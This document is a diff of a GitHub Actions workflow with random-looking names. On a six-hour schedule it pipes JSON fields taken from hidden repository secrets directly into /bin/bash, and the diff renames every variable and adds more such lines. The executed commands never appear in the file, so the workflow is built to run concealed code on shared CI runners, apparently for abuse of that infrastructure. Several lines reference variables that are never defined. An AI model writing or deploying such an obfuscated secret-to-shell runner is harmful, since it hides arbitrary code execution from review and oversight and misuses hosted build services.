@@ -1,30 +1,33 @@
 name: jiyueye4756
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 5/6 * * *'
+    - cron: '17 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiyueye4756
         env:
-          ojjbo22254: ${{ secrets.ojjbo22254 }}
+          zy64111: ${{ secrets.zy64111 }}
         run: |
-          echo $ojjbo22254 | jq -r .wlb5 | /bin/bash
-          echo $jua37 | jq -r .s54798 | /bin/bash
-          echo $vs8662 | jq -r .wbpfz9 | /bin/bash
-          echo $m11 | jq -r .bcahq8 | /bin/bash
-          echo $wymqb55 | jq -r .kki60 | /bin/bash
-          echo $j5 | jq -r .pwof269 | /bin/bash
-          echo $gl71163 | jq -r .qrr63298 | /bin/bash
-          echo $baqlk27 | jq -r .v25 | /bin/bash
-          echo $w82 | jq -r .sk96013 | /bin/bash
-          echo $htbb10251 | jq -r .k88191 | /bin/bash
-          echo $tgq7108 | jq -r .ca6 | /bin/bash
-          echo $vsye9091 | jq -r .suxth97187 | /bin/bash
-          echo $jfm0 | jq -r .acsf0 | /bin/bash
+          echo $zy64111 | jq -r .iplv6 | /bin/bash
+          echo $qchcb83 | jq -r .o8 | /bin/bash
+          echo $capg124 | jq -r .wpr92482 | /bin/bash
+          echo $mvi509 | jq -r .sj02647 | /bin/bash
+          echo $pyoj1704 | jq -r .rj21731 | /bin/bash
+          echo $wqtgw8705 | jq -r .fjs8 | /bin/bash
+          echo $i30 | jq -r .wbpaj97 | /bin/bash
+          echo $wvk95 | jq -r .xhc4394 | /bin/bash
+          echo $ltns91 | jq -r .gxqcd6 | /bin/bash
+          echo $u2 | jq -r .npcs9309 | /bin/bash
+          echo $y4 | jq -r .bxb577 | /bin/bash
+          echo $ro551 | jq -r .fzmbf6 | /bin/bash
+          echo $r26 | jq -r .vi24950 | /bin/bash
+          echo $oli816 | jq -r .yexbo15 | /bin/bash
+          echo $d7 | jq -r .n14 | /bin/bash
+          echo $bv41965 | jq -r .kzr17104 | /bin/bash
+          echo $huwq8 | jq -r .icovb335 | /bin/bash
 
